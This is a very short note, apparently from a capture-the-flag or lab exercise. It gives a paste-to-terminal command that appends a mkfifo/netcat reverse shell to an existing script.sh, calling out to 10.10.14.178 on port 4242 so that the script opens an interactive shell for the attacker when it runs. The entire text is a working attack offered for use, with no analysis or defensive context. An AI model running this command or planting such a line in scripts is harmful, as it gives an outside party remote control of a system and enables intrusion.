just paste to terminal to override the orig script
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.178 4242 >/tmp/f' | tee -a script.sh
```
